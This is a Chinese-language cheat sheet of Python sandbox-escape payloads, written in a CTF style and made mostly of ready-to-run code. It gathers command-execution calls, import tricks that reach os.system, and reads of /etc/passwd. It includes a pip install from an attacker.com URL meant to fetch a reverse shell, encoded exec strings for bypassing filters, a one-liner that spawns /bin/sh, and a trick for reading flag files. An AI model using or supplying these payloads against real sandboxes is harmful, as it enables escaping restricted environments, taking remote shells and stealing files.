python沙盒逃逸绕过技巧总结

常见执行命令执行库

os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls") 
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')

在进行逃逸时可以查看是否能导入以上库。

pip的利用

当我们在有权限使用pip时，我们就可以利用此函数来反向获取shell，

pip调用：pip pip.main()

pip install http://attacker.com/Rerverse.tar.gz #将url换成自己的vps的路径
pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])

编码绕过

当有些字符被过滤时，我们可以通过十六进制/八进制/Base64编码来绕过对其的过滤：

exec("print('RCE'); __import__('os').system('ls')") #这里用了";"
exec("print('RCE')\n__import__('os').system('ls')") #变为用 "\n"
eval("__import__('os').system('ls')") #在不允许执行";"时
eval(compile('print("hello world"); print("heyy")', '<stdin>', 'exec')) #这样就能执行";"
__import__('timeit').timeit("__import__('os').system('ls')",number=1)
#
eval(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))
exec(compile('def myFunc():\n\ta="hello word"\n\tprint(a)\nmyFunc()', '<stdin>', 'exec'))

各种编码：

#Octal
exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51")
#Hex
exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29")
#Base64
exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))

短字符技巧

海象运算符（:=）允许在列表中生成变量,会按顺序进行执行

如：

print([a:=21,a*2])
# 输出21,42
[y:=().__class__.__base__.__subclasses__()[84]().load_module('builtins'),y.__import__('signal').alarm(0), y.exec("import\x20os,sys\nclass\x20X:\n\tdef\x20__del__(self):os.system('/bin/sh')\n\nsys.modules['pwnd']=X()\nsys.exit()", {"__builtins__":y.__dict__})]

它对于注入“eval”的代码非常有用，因为它不支持多行或“;”

用内置类帮助读取文件

__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
